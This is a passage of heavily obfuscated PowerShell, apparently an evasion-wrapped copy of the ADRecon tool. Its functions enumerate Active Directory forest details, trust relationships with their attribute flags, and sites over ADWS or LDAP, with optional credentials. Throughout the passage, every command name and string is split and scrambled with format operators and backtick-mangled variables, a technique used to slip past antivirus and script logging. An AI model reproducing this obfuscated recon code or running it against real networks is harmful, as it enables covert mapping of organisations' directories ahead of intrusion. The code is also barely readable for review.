                ${o`BJ} | &("{1}{2}{0}"-f 'ember','Add-','M') -MemberType ("{0}{2}{3}{1}" -f'N','erty','ot','eProp') -Name ("{0}{1}"-f'V','alue') -Value ${obJv`AL`UEs}[${i}+1]
                ${i}++
                ${fOR`E`s`TOBJ} += ${o`BJ}
            }
            &("{3}{2}{4}{1}{0}" -f 'iable','-Var','v','Remo','e') ("{2}{1}{0}"-f 'Mode','rest','Fo')

            For(${i}=0; ${i} -lt ${aD`FOR`Est}."DO`mains"."c`OUnt"; ${i}++)
            {
                ${o`Bj} = &("{2}{1}{3}{0}" -f't','w-Obj','Ne','ec') ("{1}{0}{2}" -f'ec','PSObj','t')
                ${o`Bj} | &("{1}{2}{0}" -f 'd-Member','A','d') -MemberType ("{1}{2}{0}"-f 'y','No','tePropert') -Name ("{2}{0}{1}" -f 'or','y','Categ') -Value ("{1}{0}"-f 'omain','D')
                ${o`Bj} | &("{0}{2}{1}"-f'Add-M','r','embe') -MemberType ("{3}{2}{1}{0}"-f 'erty','teProp','o','N') -Name ("{1}{0}" -f 'alue','V') -Value ${AD`FOreSt}."D`omA`iNS"[${I}]
                ${FORE`S`TobJ} += ${O`Bj}
            }
            For(${i}=0; ${i} -lt ${adfO`R`E`st}."si`Tes"."c`ouNT"; ${I}++)
            {
                ${O`BJ} = &("{2}{1}{0}" -f'bject','ew-O','N') ("{2}{0}{1}"-f 'b','ject','PSO')
                ${o`Bj} | &("{2}{0}{1}"-f 'd-Mem','ber','Ad') -MemberType ("{2}{1}{0}"-f'y','Propert','Note') -Name ("{0}{1}{2}" -f'Ca','tego','ry') -Value ("{0}{1}" -f'S','ite')
                ${O`BJ} | &("{3}{2}{0}{1}"-f'Mem','ber','-','Add') -MemberType ("{1}{3}{2}{0}"-f'rty','N','rope','oteP') -Name ("{1}{0}" -f'lue','Va') -Value ${Adfo`R`Est}."sI`TeS"[${I}]
                ${FO`RESt`obj} += ${o`Bj}
            }
            For(${I}=0; ${i} -lt ${a`d`ForeST}."GL`ob`AL`cAtALogS"."C`OUnt"; ${i}++)
            {
                ${o`Bj} = &("{1}{2}{0}" -f'bject','N','ew-O') ("{2}{0}{1}" -f 'ec','t','PSObj')
                ${o`Bj} | &("{1}{0}{2}"-f'dd-Membe','A','r') -MemberType ("{1}{0}{3}{2}"-f 'otePro','N','erty','p') -Name ("{0}{1}{2}"-f 'C','at','egory') -Value ("{0}{3}{1}{4}{2}" -f 'Glo','alCatal','g','b','o')
                ${o`BJ} | &("{1}{2}{3}{0}" -f'ber','A','d','d-Mem') -MemberType ("{0}{1}{2}" -f'Note','Pr','operty') -Name ("{0}{1}"-f'V','alue') -Value ${a`df`oRe`ST}."g`LobaLc`A`TALOGs"[${i}]
                ${fo`ReS`TObj} += ${o`Bj}
            }

            ${O`BJ} = &("{0}{2}{1}"-f'New','t','-Objec') ("{0}{1}{2}"-f 'P','SObje','ct')
            ${o`BJ} | &("{1}{0}{2}"-f '-Membe','Add','r') -MemberType ("{3}{0}{1}{2}"-f't','ePr','operty','No') -Name ("{0}{2}{1}" -f 'Ca','ry','tego') -Value ("{2}{0}{4}{1}{3}" -f 'tone L','tim','Tombs','e','ife')
            If (${aDfOR`esttO`M`Bs`Tone`lI`FEti`ME})
            {
                ${o`Bj} | &("{3}{1}{0}{2}"-f'be','d-Mem','r','Ad') -MemberType ("{1}{0}{2}"-f'tePr','No','operty') -Name ("{1}{0}" -f'lue','Va') -Value ${aDfo`R`EstT`om`BSt`oNeLIFEtI`mE}
                &("{2}{1}{4}{0}{3}"-f'abl','move-V','Re','e','ari') ("{1}{0}{2}{3}{4}"-f'st','ADForestTomb','o','neL','ifetime')
            }
            Else
            {
                ${o`BJ} | &("{2}{0}{1}"-f'mbe','r','Add-Me') -MemberType ("{1}{2}{0}" -f'rty','NoteProp','e') -Name ("{1}{0}" -f 'alue','V') -Value ("{2}{0}{3}{1}"-f'R','d','Not ','etrieve')
            }
            ${fOR`es`T`oBj} += ${o`Bj}

            ${O`BJ} = &("{0}{1}{2}"-f 'New','-Obje','ct') ("{1}{0}" -f 'SObject','P')
            ${o`Bj} | &("{0}{3}{2}{1}" -f'Add','ember','M','-') -MemberType ("{2}{1}{0}" -f'eProperty','ot','N') -Name ("{0}{2}{1}"-f 'Cate','y','gor') -Value ("{6}{2}{7}{8}{0}{4}{1}{5}{3}"-f'in (200',' ','yc',')','8','R2 onwards','Rec','le',' B')
            If (${adr`ec`YClE`BIn})
            {
                If (${aDrecY`CL`Ebin}."prope`R`TiEs".'msDS-EnabledFeatureBL'."CO`Unt" -gt 0)
                {
                    ${O`Bj} | &("{1}{3}{2}{0}"-f'ember','A','d-M','d') -MemberType ("{3}{1}{0}{2}" -f 'Propert','te','y','No') -Name ("{1}{0}" -f'ue','Val') -Value ("{1}{2}{0}" -f'abled','E','n')
                    ${FO`RE`STObj} += ${O`Bj}
                    For(${i}=0; ${I} -lt $(${a`drEcyCL`ebin}."P`RoP`erTIeS".'msDS-EnabledFeatureBL'."c`oUNt"); ${i}++)
                    {
                        ${o`Bj} = &("{0}{2}{1}" -f'New-Obj','t','ec') ("{1}{0}{2}" -f 'bjec','PSO','t')
                        ${o`BJ} | &("{1}{0}{2}" -f'dd-Memb','A','er') -MemberType ("{2}{0}{1}"-f 'e','Property','Not') -Name ("{1}{0}{2}" -f'g','Cate','ory') -Value ("{0}{1}{2}"-f'E','na','bled Scope')
                        ${O`Bj} | &("{3}{1}{0}{2}" -f'e','b','r','Add-Mem') -MemberType ("{2}{1}{0}" -f'Property','ote','N') -Name ("{0}{1}" -f'Val','ue') -Value ${AdR`EcYcl`EbIN}."P`R`oPertiES".'msDS-EnabledFeatureBL'[${I}]
                        ${fOr`e`StObj} += ${O`Bj}
                    }
                }
                Else
                {
                    ${o`Bj} | &("{0}{2}{1}"-f'Add','ber','-Mem') -MemberType ("{1}{0}{2}" -f'ePro','Not','perty') -Name ("{0}{1}" -f 'Va','lue') -Value ("{0}{1}"-f 'Disab','led')
                    ${fore`S`To`BJ} += ${O`BJ}
                }
                &("{4}{1}{2}{0}{3}"-f'iab','move-V','ar','le','Re') ("{2}{0}{1}" -f 'B','in','ADRecycle')
            }
            Else
            {
                ${o`BJ} | &("{1}{2}{0}"-f'er','Add','-Memb') -MemberType ("{1}{3}{2}{0}" -f 'erty','N','rop','oteP') -Name ("{1}{0}"-f'ue','Val') -Value ("{2}{0}{1}"-f 'sabl','ed','Di')
                ${fOr`es`T`obJ} += ${O`Bj}
            }

            ${O`BJ} = &("{1}{0}{2}" -f'ew-','N','Object') ("{0}{1}{2}" -f'PSOb','j','ect')
            ${O`Bj} | &("{1}{0}{2}" -f'be','Add-Mem','r') -MemberType ("{0}{2}{1}" -f 'Not','y','ePropert') -Name ("{1}{0}{2}"-f'atego','C','ry') -Value (("{5}{7}{10}{9}{1}{2}{4}{6}{8}{11}{3}{0}" -f'rds)','ed',' Acce','(2016 onwa','ss Manag','P','e','riv','men','eg','il','t '))
            If (${pr`ivIlE`Ge`DacCE`ssMAn`AgEM`ENT})
            {
                If (${PRiV`I`lEG`Ed`ACC`ESs`mana`GEME`NT}."P`R`o`pERtieS".'msDS-EnabledFeatureBL'."cou`NT" -gt 0)
                {
                    ${O`BJ} | &("{1}{0}{2}"-f 'e','Add-M','mber') -MemberType ("{1}{0}{2}" -f't','NoteProper','y') -Name ("{0}{1}" -f'Val','ue') -Value ("{2}{0}{1}"-f 'e','d','Enabl')
                    ${fO`ResTo`BJ} += ${O`BJ}
                    For(${I}=0; ${I} -lt $(${pRIVi`LE`G`edACCEssManAgeM`eNt}."PROPe`Rt`Ies".'msDS-EnabledFeatureBL'."cO`UNT"); ${i}++)
                    {
                        ${O`Bj} = &("{1}{3}{0}{2}" -f 'j','New-','ect','Ob') ("{1}{0}" -f 'Object','PS')
                        ${o`Bj} | &("{1}{0}{2}{3}" -f'd-Me','Ad','m','ber') -MemberType ("{0}{3}{1}{2}"-f'Note','t','y','Proper') -Name ("{1}{0}{2}"-f'tegor','Ca','y') -Value ("{0}{2}{1}"-f'Enabled S','ope','c')
                        ${o`BJ} | &("{0}{1}{2}"-f 'A','dd-Mem','ber') -MemberType ("{2}{0}{3}{1}" -f'otePro','ty','N','per') -Name ("{1}{0}"-f 'e','Valu') -Value ${pr`IV`i`legeDa`Cce`SSmANa`GE`mEnT}."pRo`PERti`ES".'msDS-EnabledFeatureBL'[${i}]
                        ${fO`R`EstObj} += ${o`Bj}
                    }
                }
                Else
                {
                    ${o`Bj} | &("{3}{0}{2}{1}"-f 'Me','ber','m','Add-') -MemberType ("{1}{3}{0}{2}"-f'Pr','No','operty','te') -Name ("{0}{1}"-f'Val','ue') -Value ("{1}{0}"-f 'abled','Dis')
                    ${FOrE`sto`BJ} += ${O`BJ}
                }
                &("{3}{4}{2}{1}{0}" -f 'iable','ar','V','R','emove-') ("{4}{0}{6}{1}{5}{2}{3}" -f 'i','ge','ccessManagem','ent','Priv','dA','le')
            }
            Else
            {
                ${o`Bj} | &("{1}{0}{2}" -f '-','Add','Member') -MemberType ("{0}{2}{1}" -f 'N','Property','ote') -Name ("{1}{0}"-f 'lue','Va') -Value ("{0}{1}{2}" -f 'Di','sab','led')
                ${F`o`R`esToBJ} += ${O`BJ}
            }

            &("{0}{1}{3}{2}"-f'Rem','o','e-Variable','v') ("{1}{0}{2}"-f 'e','ADFor','st')
        }
    }

    If (${fO`RE`Stobj})
    {
        Return ${F`OrEStO`Bj}
    }
    Else
    {
        Return ${NU`Ll}
    }
}

Function Ge`T-`A`dRTRUST
{

    param(
        [Parameter(ManDATORY = ${tr`UE})]
        [string] ${Met`h`OD},

        [Parameter(MAndaTorY = ${Fa`lSe})]
        [DirectoryServices.DirectoryEntry] ${oBJ`dO`Ma`IN}
    )

    
    ${T`daD} = @{
        0 = ("{2}{0}{1}"-f'is','abled','D');
        1 = ("{0}{1}" -f 'In','bound');
        2 = ("{0}{2}{1}" -f'Out','d','boun');
        3 = ("{3}{1}{2}{0}" -f'ional','iDir','ect','B');
    }

    
    ${Tt`Ad} = @{
        1 = ("{2}{1}{3}{0}" -f 'evel','n','Dow','l');
        2 = ("{1}{0}" -f'l','Upleve');
        3 = "MIT";
        4 = "DCE";
    }

    If (${MEt`h`od} -eq ("{0}{1}" -f'A','DWS'))
    {
        Try
        {
            ${A`dt`RuStS} = &("{1}{2}{0}" -f 'DObject','G','et-A') -LDAPFilter ("{1}{2}{0}{3}{4}{5}"-f's','(obje','ctCla','s','=trustedDomain',')') -Properties ("{3}{2}{0}{1}" -f'edNam','e','istinguish','D'),("{3}{1}{2}{0}"-f'rtner','t','Pa','trus'),("{2}{0}{3}{1}"-f 'r','stdirection','t','u'),("{2}{0}{1}"-f 'rusttyp','e','t'),("{0}{1}{3}{2}" -f 'Tr','u','ibutes','stAttr'),("{1}{2}{0}" -f 'd','whenCreat','e'),("{1}{0}{2}" -f'n','whe','Changed')
        }
        Catch
        {
            &("{2}{1}{3}{0}"-f'g','e-','Writ','Warnin') ("{8}{5}{1}{0}{7}{6}{3}{2}{4}{9}"-f' Error ',']','dDomain','ste',' Objec','ust','umerating tru','while en','[Get-ADRTr','ts')
            &("{2}{3}{1}{0}" -f 'rbose','e','Wr','ite-V') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }

        If (${A`DtRuS`TS})
        {
            &("{1}{0}{3}{2}" -f 'ite-Verbo','Wr','e','s') "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts)) "
            
            ${A`DT`RUSto`BJ} = @()
            ${A`dt`RUs`TS} | &("{2}{0}{3}{1}"-f 'h','ct','ForEac','-Obje') {
                
                ${o`BJ} = &("{2}{1}{3}{0}"-f't','-Ob','New','jec') ("{1}{0}{2}"-f'SOb','P','ject')
                ${O`BJ} | &("{2}{1}{0}" -f'mber','Me','Add-') -MemberType ("{0}{1}{2}" -f'No','t','eProperty') -Name ("{2}{0}{1}{3}"-f'ource',' Doma','S','in') -Value (&("{0}{1}{2}"-f 'Get-','DNto','FQDN') ${_}."disTI`Ng`Ui`SHed`NA`me")
                ${O`BJ} | &("{1}{0}{2}"-f 'emb','Add-M','er') -MemberType ("{2}{1}{0}{3}" -f'ropert','teP','No','y') -Name ("{0}{2}{1}"-f'Targe','Domain','t ') -Value ${_}."T`RUsTP`ARTNEr"
                ${t`R`U`stdIr`ecTIOn} = [string] ${TD`AD}[${_}."tRUSTdIr`e`CtioN"]
                ${O`BJ} | &("{2}{0}{1}"-f'e','r','Add-Memb') -MemberType ("{1}{0}{2}"-f 'oteP','N','roperty') -Name ("{2}{1}{0}{3}"-f'irectio',' D','Trust','n') -Value ${TrUs`Td`iRE`cTIoN}
                ${tRuS`T`Type} = [string] ${tt`Ad}[${_}."t`Ru`st`TyPE"]
                ${O`Bj} | &("{2}{0}{1}"-f'm','ber','Add-Me') -MemberType ("{2}{1}{0}"-f 'y','otePropert','N') -Name ("{3}{1}{0}{2}" -f 's','u','t Type','Tr') -Value ${TRus`Tt`yPE}

                ${T`RuST`Attr`ibutES} = ${n`UlL}
                If ([int32] ${_}."T`RuS`TAttr`Ib`UtES" -band 0x00000001) { ${T`RUS`TaTTrib`U`TES} += ("{1}{3}{2}{4}{0}" -f',','Non','ansiti',' Tr','ve') }
                If ([int32] ${_}."T`R`Ustat`TriBUtEs" -band 0x00000002) { ${t`R`U`STatt`RibUT`Es} += ("{2}{1}{0}" -f 'Level,','p','U') }
                If ([int32] ${_}."trusTAtT`RIBu`T`eS" -band 0x00000004) { ${TRU`s`TA`TtRi`BUTeS} += ("{1}{3}{2}{0}" -f ',','Quar','ed','antin') } 
                If ([int32] ${_}."TrUsta`T`TribU`Tes" -band 0x00000008) { ${t`RU`sTAtt`RI`ButEs} += ("{4}{0}{5}{1}{3}{2}"-f 'or','s','ive,','it','F','est Tran') }
                If ([int32] ${_}."trUsTAtt`RIbut`Es" -band 0x00000010) { ${T`RUsTattr`Ib`UteS} += ("{5}{4}{3}{1}{2}{0}"-f'n,','ti','o','s Organiza','ros','C') } 
                If ([int32] ${_}."TR`Ust`Att`Ri`ButEs" -band 0x00000020) { ${tR`US`TaTT`RiBuTeS} += ("{4}{0}{3}{1}{2}"-f'th','For','est,','in ','Wi') }
                If ([int32] ${_}."trUstAT`Tri`BUteS" -band 0x00000040) { ${trU`sTaT`TRi`BuTes} += ("{1}{2}{5}{0}{4}{3}"-f 'er','Tr','eat as ','al,','n','Ext') }
                If ([int32] ${_}."TrustattR`IbU`TeS" -band 0x00000080) { ${T`Ru`STa`TTRibutES} += ("{2}{0}{5}{4}{3}{1}"-f 'nc','n,','Uses RC4 E','io','pt','ry') }
                If ([int32] ${_}."TRUstaT`Tr`I`BUtEs" -band 0x00000200) { ${trU`S`TaT`Tr`iBUteS} += ("{3}{2}{0}{1}" -f'tion',',',' TGT Delega','No') }
                If ([int32] ${_}."tRUStATt`R`IbU`T`Es" -band 0x00000400) { ${TruST`A`TT`RiBU`TeS} += ("{1}{2}{0}"-f'ust,','PIM T','r') }
                If (${TrUs`TAt`T`RiB`UTes})
                {
                    ${TRUs`T`A`TT`RIButeS} = ${tRus`Tatt`RIbut`es}.("{0}{2}{1}" -f'T','nd','rimE').Invoke(",")
                }
                ${O`Bj} | &("{2}{1}{0}" -f 'Member','-','Add') -MemberType ("{1}{0}{2}" -f 'eP','Not','roperty') -Name ("{2}{1}{0}"-f'utes','ib','Attr') -Value ${tRUs`TATt`RIbut`Es}
                ${o`Bj} | &("{2}{0}{1}{3}"-f '-M','emb','Add','er') -MemberType ("{1}{3}{2}{0}" -f'rty','N','Prope','ote') -Name ("{3}{1}{2}{0}" -f 'd','rea','te','whenC') -Value ([DateTime] $(${_}."whe`NcR`EATeD"))
                ${O`Bj} | &("{1}{0}{2}" -f'd-Mem','Ad','ber') -MemberType ("{2}{1}{0}"-f 'roperty','eP','Not') -Name ("{3}{0}{2}{1}" -f'h','ed','enChang','w') -Value ([DateTime] $(${_}."W`HE`NchA`NgEd"))
                ${Ad`T`R`USTObJ} += ${O`BJ}
            }
            &("{3}{1}{4}{2}{0}"-f 'e','Var','bl','Remove-','ia') ("{1}{0}"-f 'ts','ADTrus')
        }
    }

    If (${M`Et`hOd} -eq ("{1}{0}"-f'AP','LD'))
    {
        ${OBjsE`AR`chER} = &("{0}{2}{1}"-f'New-','bject','O') ("{0}{7}{5}{2}{10}{6}{1}{11}{8}{3}{9}{4}" -f 'Sy','ce','Dire','t','archer','.','toryServi','stem','rec','orySe','c','s.Di') ${O`B`JDoMAiN}
        ${O`BJse`ArCHER}."PaG`e`Size" = ${p`A`gEsiZe}
        ${OB`jSear`ch`eR}."f`iL`TEr" = (("{6}{3}{1}{0}{7}{2}{5}{4}" -f'ss','bjectCla','trusted','o',')','Domain','(','='))
        ${ObjSEARc`h`ER}."pr`O`P`ErtiESTOlO`Ad".("{0}{2}{1}"-f 'Add','nge','Ra').Invoke((("{1}{3}{2}{0}"-f 'ame','d','inguishedn','ist'),("{2}{1}{0}" -f'tpartner','s','tru'),("{2}{3}{1}{0}" -f 'ction','e','trustdi','r'),("{1}{2}{0}" -f'ype','trust','t'),("{3}{0}{4}{2}{1}"-f 'ust','tes','bu','tr','attri'),("{1}{2}{0}"-f 'ated','whe','ncre'),("{2}{1}{0}"-f 'nged','hencha','w')))
        ${ob`jS`e`ArCheR}."SE`ARchs`CoPe" = ("{0}{1}{2}"-f 'Subt','r','ee')

        Try
        {
            ${aDt`RUSTS} = ${obJ`sE`Ar`cHER}.("{1}{0}{2}"-f 'indAl','F','l').Invoke()
        }
        Catch
        {
            &("{1}{2}{3}{0}" -f'ning','Write','-','War') ("{2}{5}{6}{12}{9}{1}{4}{8}{11}{10}{3}{0}{13}{7}{14}" -f' trustedDoma',' whi','[Get-ADRTr','g','l','ust',']','n Objec','e enu','Error','ratin','me',' ','i','ts')
            &("{1}{3}{2}{0}{4}" -f'e','Wr','e-V','it','rbose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${N`ULl}
        }
        ${OBj`s`E`ARCHer}.("{1}{0}"-f 'ispose','d').Invoke()

        If (${a`d`Tru`Sts})
        {
            &("{1}{0}{2}"-f'ri','W','te-Verbose') "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts)) "
            
            ${Adtr`US`ToBj} = @()
            ${Adtrus`Ts} | &("{0}{4}{2}{1}{3}"-f 'Fo','jec','h-Ob','t','rEac') {
                
                ${o`BJ} = &("{1}{0}{2}"-f'-Obje','New','ct') ("{2}{0}{1}" -f 'b','ject','PSO')
                ${O`BJ} | &("{0}{2}{3}{1}"-f 'Ad','r','d-','Membe') -MemberType ("{0}{1}{2}"-f'NoteProp','e','rty') -Name ("{0}{2}{1}"-f'Sourc','omain','e D') -Value $(&("{2}{0}{3}{1}"-f't-D','toFQDN','Ge','N') ([string] ${_}."P`R`oPERTi`ES"."DIStING`UiSH`eD`Name"))
                ${O`Bj} | &("{2}{1}{0}"-f'r','dd-Membe','A') -MemberType ("{0}{2}{1}"-f'No','operty','tePr') -Name ("{2}{0}{1}" -f 'get Domai','n','Tar') -Value $([string] ${_}."PRop`E`RTiEs"."t`RUSTPar`T`NER")
                ${t`RUst`Di`REC`TIOn} = [string] ${TD`AD}[${_}."PRoPER`Ti`eS"."TRu`sTD`i`RecTion"]
                ${o`BJ} | &("{2}{0}{1}" -f'd-Me','mber','Ad') -MemberType ("{0}{1}{2}{3}" -f'Note','P','rop','erty') -Name ("{3}{1}{0}{2}"-f ' Dir','ust','ection','Tr') -Value ${tR`UST`Dir`ectIon}
                ${TR`Ust`TYPE} = [string] ${t`TAd}[${_}."PrOpeR`Ti`Es"."tR`U`StTY`pe"]
                ${O`Bj} | &("{2}{3}{1}{0}" -f'r','be','Add-','Mem') -MemberType ("{3}{0}{1}{2}"-f'eP','ro','perty','Not') -Name ("{1}{0}{2}"-f ' T','Trust','ype') -Value ${t`RUst`TY`PE}

                ${TrUSt`A`TtR`i`BUtES} = ${nu`ll}
                If ([int32] ${_}."p`RO`perTIeS"."Tru`StatT`RIbU`T`ES"[0] -band 0x00000001) { ${Tr`Us`TAtTrIb`UTeS} += ("{2}{1}{0}"-f 'nsitive,','n Tra','No') }
                If ([int32] ${_}."Pr`oPEr`TIes"."T`Ru`stA`TtribUT`eS"[0] -band 0x00000002) { ${T`R`UsTAt`T`RIbUTes} += ("{1}{0}"-f'l,','UpLeve') }
                If ([int32] ${_}."P`R`OPerTIES"."trUsTATTR`IB`UTeS"[0] -band 0x00000004) { ${tRUs`TaTtri`B`UT`Es} += ("{2}{1}{0}"-f 'ined,','uarant','Q') } 
                If ([int32] ${_}."pr`OP`eRtI`Es"."TRUSTATtRIB`U`Tes"[0] -band 0x00000008) { ${TRuS`T`AtTr`Ib`UtEs} += ("{1}{3}{0}{4}{2}"-f 'ran','Forest ','ive,','T','sit') }
                If ([int32] ${_}."p`ROp`er`Ties"."t`RuSTAt`TRIb`U`Tes"[0] -band 0x00000010) { ${Tru`sTaTTrIb`U`T`es} += ("{2}{1}{4}{5}{3}{0}"-f',','ross Organi','C','ion','za','t') } 
                If ([int32] ${_}."PRo`P`eRtiES"."tRu`STAT`Tri`B`UTES"[0] -band 0x00000020) { ${t`RuSTaT`TRi`BUt`ES} += ("{0}{4}{3}{2}{1}" -f'W',',',' Forest','hin','it') }
                If ([int32] ${_}."PROP`erT`ieS"."TrUsT`At`TrIB`UtEs"[0] -band 0x00000040) { ${Tru`StaTtri`But`Es} += ("{3}{4}{2}{0}{1}" -f 'e','rnal,','Ext','Tr','eat as ') }
                If ([int32] ${_}."PrOPE`Rt`i`Es"."trUSTa`TTrIBUT`Es"[0] -band 0x00000080) { ${t`Rus`TaT`Tr`IBUtes} += ("{1}{4}{0}{5}{6}{2}{3}" -f'E','Uses RC','ption',',','4 ','nc','ry') }
                If ([int32] ${_}."p`RoPert`iEs"."T`RuStattrib`UT`ES"[0] -band 0x00000200) { ${t`Ru`StaTTRiB`UTeS} += ("{3}{0}{1}{2}" -f' TGT',' Deleg','ation,','No') }
                If ([int32] ${_}."pro`PE`RTies"."TRu`sTaT`TRIbuT`Es"[0] -band 0x00000400) { ${T`R`UstAttRibU`TES} += ("{2}{1}{0}"-f ',','IM Trust','P') }
                If (${TrusT`A`TTrIbU`TES})
                {
                    ${T`R`Us`TAttRIBUTeS} = ${t`RUstATtr`IB`UTes}.("{0}{1}{2}" -f 'T','rimE','nd').Invoke(",")
                }
                ${o`BJ} | &("{2}{1}{0}" -f'Member','-','Add') -MemberType ("{1}{0}{3}{2}" -f 'Pro','Note','ty','per') -Name ("{2}{3}{1}{0}"-f 'es','t','Attri','bu') -Value ${TrU`S`TATt`Rib`UtES}
                ${o`Bj} | &("{0}{1}{2}"-f 'Add-Mem','b','er') -MemberType ("{1}{3}{0}{2}"-f 't','N','eProperty','o') -Name ("{1}{0}{3}{2}" -f'n','whe','ated','Cre') -Value ([DateTime] $(${_}."PR`oP`eRt`IeS"."whencR`EaT`ED"))
                ${O`BJ} | &("{2}{0}{1}" -f 'dd-M','ember','A') -MemberType ("{2}{1}{3}{0}" -f'erty','ot','N','eProp') -Name ("{2}{0}{1}" -f 'Chan','ged','when') -Value ([DateTime] $(${_}."ProP`eR`TIES"."W`he`Nc`HaNGeD"))
                ${adT`RuST`o`Bj} += ${o`Bj}
            }
            &("{3}{0}{2}{4}{1}"-f'o','iable','ve-Va','Rem','r') ("{1}{0}{2}"-f'rus','ADT','ts')
        }
    }

    If (${ADTr`US`T`obj})
    {
        Return ${a`D`TRUS`TObJ}
    }
    Else
    {
        Return ${n`UlL}
    }
}

Function GeT`-ADRS`itE
{

    param(
        [Parameter(mandATOrY = ${tR`UE})]
        [string] ${M`etH`Od},

        [Parameter(mAnDatOry = ${f`A`LsE})]
        [DirectoryServices.DirectoryEntry] ${Obj`do`MAiN},

        [Parameter(MaNDAtORy = ${Fa`LSE})]
        [DirectoryServices.DirectoryEntry] ${OBjdO`Mai`N`ROoTd`SE},

        [Parameter(manDaTOry = ${F`ALse})]
        [string] ${dO`MaI`NCON`TroL`lEr},

        [Parameter(mAnDAToRy = ${f`AL`se})]
        [Management.Automation.PSCredential] ${c`R`edEN`TiaL} =   ( GcI  vARiabLe:NK5P  ).vAlUE::"e`mpty"
    )

    If (${Me`Th`Od} -eq ("{1}{0}" -f'WS','AD'))
    {
        Try
        {
            ${S`EaRCH`Path} = ("{0}{2}{1}" -f 'CN=Si','s','te')
            ${ads`I`TeS} = &("{1}{0}{2}" -f '-ADO','Get','bject') -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{0}{4}{1}{2}{3}" -f '(','ectCla','ss','=site)','obj') -Properties ("{1}{0}" -f'e','Nam'),("{0}{2}{1}{3}" -f'Desc','t','rip','ion'),("{3}{1}{2}{0}"-f 'ed','en','Creat','wh'),("{0}{1}{2}" -f 'whenC','ha','nged')
        }
        Catch
        {
            &("{0}{2}{3}{1}" -f'Wr','e-Warning','i','t') ("{2}{7}{6}{8}{0}{4}{1}{10}{9}{11}{5}{3}{12}" -f' Error','w','[G','ng Site Ob',' ','ati','-ADRSit','et','e]','le','hi',' enumer','jects')
            &("{1}{2}{0}" -f'-Verbose','Wri','te') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`UlL}
        }

        If (${a`dsit`eS})
        {
            &("{3}{0}{1}{2}" -f 'r','ite-Verbos','e','W') "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites)) "
            
            ${A`dSit`EoBj} = @()
            ${a`D`sitES} | &("{2}{0}{1}{3}" -f'rEac','h-','Fo','Object') {
                
                ${o`BJ} = &("{0}{2}{1}"-f'New-Ob','t','jec') ("{0}{2}{1}" -f 'PSO','ject','b')
                ${o`Bj} | &("{2}{3}{1}{0}" -f'ber','Mem','A','dd-') -MemberType ("{2}{1}{0}{3}"-f 'e','p','NotePro','rty') -Name ("{1}{0}"-f 'me','Na') -Value ${_}."NA`me"
                ${O`BJ} | &("{0}{2}{1}" -f 'Add-Mem','er','b') -MemberType ("{3}{1}{2}{0}" -f'ty','r','oper','NoteP') -Name ("{1}{0}{2}"-f'ipti','Descr','on') -Value ${_}."dE`sc`R`IptION"
                ${o`BJ} | &("{2}{0}{3}{1}"-f'dd','mber','A','-Me') -MemberType ("{0}{2}{1}" -f'NoteP','rty','rope') -Name ("{0}{2}{1}" -f 'wh','Created','en') -Value ${_}."W`hE`NCREateD"
                ${O`BJ} | &("{1}{2}{0}{3}" -f'm','A','dd-Me','ber') -MemberType ("{2}{3}{0}{1}" -f 'per','ty','Not','ePro') -Name ("{1}{0}{2}" -f'n','whe','Changed') -Value ${_}."WhENC`h`ANg`Ed"
                ${A`Ds`It`eoBJ} += ${o`BJ}
            }
            &("{1}{0}{2}{3}" -f 'm','Re','ove-V','ariable') ("{1}{0}{2}" -f'DSite','A','s')
        }
    }

    If (${M`eThoD} -eq ("{0}{1}" -f 'L','DAP'))
    {
        ${S`EarcHp`A`TH} = ("{2}{0}{1}"-f'e','s','CN=Sit')
        If (${CR`E`DE`NTIAl} -ne   ( gET-VArIABLE ('n'+'K5p')  ).VAlue::"emp`Ty")
        {
            ${OBj`se`ArChP`ATH} = &("{0}{3}{1}{2}" -f'New-','bje','ct','O') ("{0}{4}{1}{5}{2}{8}{3}{9}{6}{7}"-f'S','st','ir','ervices.','y','em.D','e','ctoryEntry','ectoryS','Dir') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", ${C`ReD`en`TIaL}."UsE`RnAmE",${cRE`DeNT`I`AL}.("{3}{2}{4}{0}{1}{5}" -f 'rkC','reden','etNe','G','two','tial').Invoke()."pa`SSw`ord"
        }
        Else
        {
            ${o`BJseaR`ChPaTh} = &("{2}{1}{0}" -f 'ject','-Ob','New') ("{2}{8}{4}{3}{6}{5}{1}{0}{7}{9}"-f're','Di','S','r','to','ces.','yServi','ctoryE','ystem.Direc','ntry') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        ${OBj`s`Ear`CheR} = &("{1}{2}{0}"-f 't','N','ew-Objec') ("{7}{0}{1}{3}{5}{6}{9}{4}{8}{2}"-f 'D','i','earcher','rector','ector','yServices','.','System.','yS','Dir') ${o`B`jse`ArChPATh}
        ${oBJs`e`A`RchEr}."F`ilT`ER" = (("{4}{2}{1}{3}{0}"-f'te)','a','objectCl','ss=si','('))
        ${ObJ`Se`ArCHer}."S`EARCHsc`ope" = ("{0}{2}{1}" -f 'S','ee','ubtr')

        Try
        {
            ${A`dSi`TeS} = ${objSEaR`cH`Er}.("{1}{0}"-f'll','FindA').Invoke()
        }
        Catch
        {
            &("{0}{1}{2}"-f'Writ','e-Wa','rning') ("{2}{8}{3}{0}{6}{1}{9}{11}{7}{10}{4}{5}"-f 'r while','e','[Get-ADRSite','rro','bjec','ts',' ',' ','] E','numeratin','Site O','g')
            &("{3}{1}{2}{0}" -f'bose','-V','er','Write') "[EXCEPTION] $($_.Exception.Message) "
            Return ${NU`ll}
        }
        ${oBJS`E`ARCHER}.("{1}{0}" -f 'se','dispo').Invoke()

        If (${adsI`T`es})
        {
            &("{1}{0}{2}{3}"-f'e','Write-V','rbos','e') "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites)) "
            
            ${ad`S`i`TeoBJ} = @()
            ${Ad`S`itEs} | &("{1}{2}{0}{3}" -f'Obje','ForE','ach-','ct') {
                
                ${o`Bj} = &("{2}{1}{0}" -f 'ject','b','New-O') ("{1}{2}{0}" -f'ect','P','SObj')
